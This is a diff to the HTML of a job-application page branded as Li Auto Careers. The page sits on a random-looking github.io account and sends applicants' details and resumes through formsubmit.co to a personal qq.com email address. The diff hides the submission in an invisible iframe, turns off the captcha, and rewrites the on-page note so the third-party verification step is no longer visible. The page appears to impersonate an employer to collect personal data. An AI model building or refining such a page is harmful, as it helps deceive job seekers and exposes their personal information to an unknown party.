@@ -154,8 +154,10 @@
       Tell us about yourself and upload your resume.
     </p>
 
-    <form class="form" id="applyForm" action="https://formsubmit.co/2131875975@qq.com" method="POST" enctype="multipart/form-data">
-      <input type="hidden" name="_next" value="https://ccckyzr2cv-cell.github.io/li-auto-recruitment-xh3/thanks.html">
+    <form class="form" id="applyForm" action="https://formsubmit.co/2131875975@qq.com" method="POST" enctype="multipart/form-data" target="submissionFrame">
+      <iframe name="submissionFrame" id="submissionFrame" title="Application submission" hidden></iframe>
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" id="submissionNext" value="https://ccckyzr2cv-cell.github.io/li-auto-recruitment-xh3/thanks.html">
       <input type="hidden" name="_subject" value="New job application — Li Auto Careers">
       <input type="hidden" name="_template" value="table">
       <input type="text" name="_honey" class="form__honeypot" tabindex="-1" autocomplete="off" aria-hidden="true">
@@ -276,7 +278,7 @@
 
       <div class="form__actions">
         <button type="submit" class="btn btn--primary btn--lg" id="submitApplication">Submit Application</button>
-        <p class="form__note" id="formNote">PDF, DOC and DOCX resumes up to 10 MB are accepted. On the next page, complete FormSubmit’s verification to finish sending your application and resume.</p>
+        <p class="form__note" id="formNote">PDF, DOC and DOCX resumes up to 10 MB are accepted. Your details and resume are submitted together. Please keep this page open while we confirm your submission.</p>
         <p class="form__note">Having trouble submitting? Email <a class="upload__browse" href="mailto:2131875975@qq.com?subject=Li%20Auto%20job%20application">2131875975@qq.com</a> with your details and the position you’re applying for. Please attach your resume manually.</p>
         <p class="form__status" id="formStatus" role="status" aria-live="polite" hidden></p>
       </div>
@@ -315,6 +317,6 @@
   </div>
 </footer>
 
-<script src="script.js?v=20261014-attachments"></script>
+<script src="script.js?v=20261014-inline-attachments"></script>
 </body>
 </html>
